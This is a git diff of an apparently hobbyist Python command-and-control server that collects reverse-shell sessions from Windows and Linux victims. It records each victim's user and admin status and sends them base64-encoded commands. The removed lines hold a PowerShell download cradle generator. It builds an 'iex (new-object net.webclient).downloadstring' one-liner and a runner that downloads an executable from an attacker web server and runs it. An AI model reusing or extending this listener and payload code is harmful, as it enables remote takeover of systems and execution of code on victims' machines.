@@ -1,7 +1,7 @@
 from datetime import datetime
 from menus import banner, help, bcolors
 from prettytable import PrettyTable
-from shells import reverseshell
+from shells import reverseshell, cradles
 
 import base64
 import random
@@ -20,15 +20,25 @@ TODO Somethings I can try out:
 
 
 BUFFER = 1024
+PADDING_WIDTH = 3
+
+# flags
+STOP_SERVER = 1
+RUN_SERVER = 0
+
+WINDOWS_UID = 1
+WINDOWS_PAYLOAD = 1
+LINUX_PAYLOAD = 2
 
 def comms_in(target_id):
-    """ Handles all responses sent from a sockclient.
+    """ Handles all responses sent from a client back to
+        the server.
 
     Args:
-        target_id (int): _description_
+        target_id (int): The session ID returning a response to a server.
 
     Returns:
-        string: _description_
+        string: The response from the client.
     """
     print('[+] Awaiting response...')
     response = target_id.recv(BUFFER).decode()
@@ -37,11 +47,11 @@ def comms_in(target_id):
     return response
 
 def comms_out(target_id, message):
-    """ Sends commands from the sockserver to a sockclient.
+    """ Sends commands from the server to a client.
 
     Args:
-        target_id (int): _description_
-        message (string): _description_
+        target_id (int): The session ID to send the message to.
+        message (string): The command to be sent to a client.
     """
     message = str(message)
     message = base64.b64encode(bytes(message, encoding='utf8'))
@@ -51,7 +61,7 @@ def target_comm(target_id, targets, num):
     """ Manages the command and traffic control.
 
     Args:
-        target_id (int): _description_
+        target_id (int): The ID of the session being interacted with.
     """
     while True:
         message = input(bcolors.OKBLUE + f'{targets[num][3]}/{targets[num][1]}#> ' + bcolors.ENDC)
@@ -120,8 +130,7 @@ def comms_handler():
     """
     while True:
         # ! WHY IS THIS NOT WORKING ON LINUX?
-        if kill_flag == 1:
-            print('OHHHH NOOOOO')
+        if kill_flag == STOP_SERVER:
             break
         try:
             remote_target, remote_ip = sock.accept()
@@ -135,18 +144,17 @@ def comms_handler():
             op_sys = remote_target.recv(BUFFER).decode()
             op_sys = base64.b64decode(op_sys).decode()
 
-            if admin == 1:
+            if admin == WINDOWS_UID:
                 # if target is Windows (UID = 1)
                 is_admin = bcolors.OKGREEN + 'Yes' + bcolors.ENDC
             else:
                 if  username == 'root':
-                    # could be a linux machine
                     # else if target is Linux (UID = 0)
                     is_admin = bcolors.OKGREEN + 'Yes' + bcolors.ENDC
                 else:
                     is_admin = bcolors.FAIL + 'No' + bcolors.ENDC
 
-            payload_val = 1 if 'Windows' in op_sys else 2
+            payload_val = WINDOWS_PAYLOAD if 'Windows' in op_sys else LINUX_PAYLOAD
 
             # get the time when the target client connects
             curr_time = time.strftime("%H:%M:%S", time.localtime())
@@ -155,56 +163,18 @@ def comms_handler():
 
             # get the host name of the target client
             host_name = socket.gethostbyaddr(remote_ip[0])
-            if host_name is not None:
-                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", datetime_record, username, is_admin, op_sys, payload_val, bcolors.OKGREEN + 'Active' + bcolors.ENDC])
-                print(bcolors.OKGREEN + f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + bcolors.ENDC + 'Enter command $ ',end='')
-            else:
-                targets.append([remote_target, remote_ip[0], datetime_record, username, is_admin, op_sys, payload_val, 'Active'])
-                print(bcolors.OKGREEN + f'\n[+] Connection received from {remote_ip[0]}\n' + bcolors.ENDC + 'Enter command $ ',end='')
+
+            target_name = (f"{host_name[0]}@{remote_ip[0]}") if host_name is not None else remote_ip[0]
+            targets.append([remote_target, target_name, datetime_record, username, is_admin, op_sys, payload_val, bcolors.OKGREEN + 'Active' + bcolors.ENDC])
+            print(bcolors.OKGREEN + f'\n[+] Connection received from {target_name}\n' + bcolors.ENDC + 'Enter command $ ',end='')
         except:
             pass
 
-def powershell_cradle():
-    """ Download a payload on a remote Windows machine in order to execute and get a
-        return sessions. Generates an encoded PowerShell download cradle.
-    """
-
-    # specify the IP and port that will run a webserver on
-    web_server_ip = input('[+] Web server listening host: ')
-    web_server_port = input('[+] Web server port: ')
-
-    payload_name = input('[+] Payload name: ')
-
-    # create powershell runner containing the command string used to
-    # download the file itself and execute
-    runner_file = (''.join(random.choices(string.ascii_lowercase,k=6)))
-    runner_file = f'{runner_file}.txt'
-
-    randomised_exe_file = (''.join(random.choices(string.ascii_lowercase,k=6)))
-    randomised_exe_file = f'{randomised_exe_file}.exe'
-
-    print('[+] Run the following command to start a web server: ' + bcolors.BOLD + f'\npython3 -m http.server -b {web_server_ip} {web_server_port}')
-
-    runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{web_server_ip}:{web_server_port}/{runner_file}')".encode('utf-16le')
-
-    with open(runner_file, 'w') as f:
-        f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload_name} -outfile {randomised_exe_file}; Start-Process -FilePath {randomised_exe_file}')
-        f.close()
-
-    b64_runner_cal = base64.b64encode(runner_cal_unencoded)
-    b64_runner_cal = b64_runner_cal.decode()
-    print(f'\n[+] Encoded payload\n\npowershell -e {b64_runner_cal}')
-
-    b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
-    print(f'\n[+] Unencoded payload\n\n{b64_runner_cal_decoded}')
-
 if __name__ == '__main__':
-    """ Main function. This is the entry
-        point into the program.
-    """
+    """Main function. This is the entry point into the program."""
     banner()
     targets = []
-    kill_flag = 0
+    kill_flag = RUN_SERVER
     listener_counter = 0
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -222,7 +192,7 @@ if __name__ == '__main__':
                 listener_counter += 1
 
             if command == 'pshell_shell':
-                powershell_cradle()
+                cradles.powershell_cradle()
 
             if command == 'winplant py':
                 if listener_counter > 0:
@@ -230,9 +200,9 @@ if __name__ == '__main__':
                 else:
                     print(bcolors.WARNING + '[-] You cannot generate a Windows payload without an active listener' + bcolors.ENDC)
 
-            if command == 'unixplant py':
+            if command == 'linuxplant py':
                 if listener_counter > 0:
-                    # reverseshell.create_unix_payload(host_ip, host_port)
+                    # reverseshell.create_linux_payload(host_ip, host_port)
                     print(bcolors.WARNING + '[-] This feature is not yet ready!')
                 else:
                     print(bcolors.WARNING + '[-] You cannot generate a Linux payload without an active listener' + bcolors.ENDC)
@@ -277,7 +247,7 @@ if __name__ == '__main__':
                 session_counter = 0
 
                 # list sessions
-                if command.split(" ")[1] == '-l':
+                if command.split(" ")[1] == '-l' or command.split(" ")[1] == '--list':
                     print("")
                     sessions_table = PrettyTable()
                     sessions_table.field_names = [
@@ -290,9 +260,10 @@ if __name__ == '__main__':
                         bcolors.BOLD + 'Connection Time' + bcolors.ENDC
                     ]
 
-                    sessions_table.padding_width = 3
+                    sessions_table.padding_width = PADDING_WIDTH
 
                     for target in targets:
+                        # define variables for readability
                         status = target[7]
                         username = target[3]
                         admin = target[4]
@@ -306,27 +277,20 @@ if __name__ == '__main__':
                     print("")
 
                 # interact with individual sessions
-                if command.split(" ")[1] == '-i':
+                if command.split(" ")[1] == '-i' or command.split(" ")[1] == '--interact':
                     try:
                         num = int(command.split(" ")[2])
                         target_id = (targets[num])[0]
+
                         if 'Active' in (targets[num])[7]:
                             target_comm(target_id, targets, num)
                         else:
-                            print(
-                                bcolors.WARNING + '[-] ' +
-                                bcolors.BOLD +
-                                'WARNING: ' +
-                                bcolors.ENDC +
-                                bcolors.WARNING +
-                                'You cannot interact with a dead session' +
-                                bcolors.ENDC
-                            )
+                            print(bcolors.WARNING + '[-] ' + 'WARNING: You cannot interact with a dead session' + bcolors.ENDC)
                     except IndexError:
                         print(bcolors.FAIL + f'[-] Session {num} does not exist.' + bcolors.ENDC)
 
         except KeyboardInterrupt:
-            quit_message = input(bcolors.WARNING + '\n[+] Are you sure you want to quit? (y/n) ' + bcolors.ENDC)
+            quit_message = input(bcolors.WARNING + '\n[-] Are you sure you want to quit? (y/n) ' + bcolors.ENDC)
 
             if quit_message == 'y':
                 len_targets = len(targets)
@@ -335,7 +299,7 @@ if __name__ == '__main__':
                         pass
                     else:
                         comms_out(target[0], 'exit')
-                kill_flag = 1
+                kill_flag = STOP_SERVER
                 if listener_counter > 0:
                     sock.close()
                 break
